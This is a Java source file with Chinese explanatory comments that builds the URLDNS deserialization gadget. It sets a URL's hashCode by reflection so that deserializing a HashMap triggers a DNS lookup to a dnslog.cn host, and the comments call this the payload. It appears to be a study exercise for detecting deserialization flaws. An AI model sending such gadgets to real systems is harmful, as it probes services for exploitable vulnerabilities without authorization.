package URLDNS;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {

    public static void main(String[] args) throws Exception {
        HashMap<URL, String> hashMap = new HashMap<URL, String>();// 定义一个hashMap，key为URL,value为String
        URL url = new URL("http://nk3z5e.dnslog.cn");// 设置我们触发dns查询的url

        // 下面在put前修改url的hashcode为非-1的值，put后将hashcode修改为-1
        // 1. 将url的hashCode字段设置为允许修改
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);
        // 2. 设置url的hashCode字段为任意不为-1的值
        f.set(url, 111);
        System.out.println(url.hashCode()); // 获取hashCode的值，验证是否修改成功
        // 3. 将 url 放入 hashMap 中，右边参数随便写
        hashMap.put(url, "" +
                "");
        // 4. 修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）
        f.set(url, -1);

        //序列化操作
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
        oos.writeObject(hashMap);

        //反序列化，触发payload
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("out.bin"));
        ois.readObject();
    }
}
